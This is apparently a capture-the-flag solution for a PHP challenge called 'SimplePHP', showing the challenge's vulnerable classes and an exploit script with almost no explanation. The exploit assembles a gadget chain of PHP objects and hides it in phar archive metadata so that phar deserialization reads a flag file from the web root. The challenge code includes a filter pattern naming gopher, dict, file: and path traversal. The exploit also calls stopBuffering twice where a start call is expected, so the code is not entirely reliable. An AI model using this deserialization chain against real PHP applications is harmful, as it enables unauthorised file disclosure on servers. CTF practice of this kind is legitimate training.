## SimplePHP
```php
<?php  
class C1e4r  
{  
    public $test;  
    public $str;  
    public function __construct($name)  
    {        
	    $this->str = $name;  
    }  
    public function __destruct()  
    {        
	    $this->test = $this->str;  
        echo $this->test;  
    }  
}  
  
class Show  
{  
    public $source;  
    public $str;  
    public function __construct($file)  
    {        
	    $this->source = $file;   //$this->source = phar://phar.jpg        
	    echo $this->source;  
    }  
    public function __toString()  
    {        
	    $content = $this->str['str']->source;  
        return $content;  
    }  
    public function __set($key,$value)  
    {        
	    $this->$key = $value;  
    }  
    public function _show()  
    {  
        if(preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i',$this->source)) {  
            die('hacker!');  
        } else {            
	        highlight_file($this->source);  
        }  
          
    }  
    public function __wakeup()  
    {  
        if(preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {  
            echo "hacker~";            
		    $this->source = "index.php";  
        }  
    }  
}  
class Test  
{  
    public $file;  
    public $params;  
    public function __construct()  
    {        
	    $this->params = array();  
    }  
    public function __get($key)  
    {  
        return $this->get($key);  
    }  
    public function get($key)  
    {  
        if(isset($this->params[$key])) {            
	        $value = $this->params[$key];  
        } else {            
	        $value = "index.php";  
        }  
        return $this->file_get($value);  
    }  
    public function file_get($value)  
    {        
	    $text = base64_encode(file_get_contents($value));  
        return $text;  
    }  
}  
?>
```


exp
```PHP
<?php
class C1e4r
{
    public $test;
    public $str;
}

class Show
{
    public $source;
    public $str;
}
class Test
{
    public $file;
    public $params;
}

$C1e4r = new C1e4r();
$Show = new Show();
$Test = new Test();
$Test->params['source'] = "/var/www/html/f1ag.php";
$Show->str['str'] = $Test;
$C1e4r->str = $Show;

$phar = new Phar('phar.phar');
$phar -> stopBuffering();
$phar -> setStub("<?php __HALT_COMPILER();?>");
$phar -> addFromString('test.txt','test');
$object = $C1e4r;
$phar -> setMetadata($object);
$phar -> stopBuffering();
```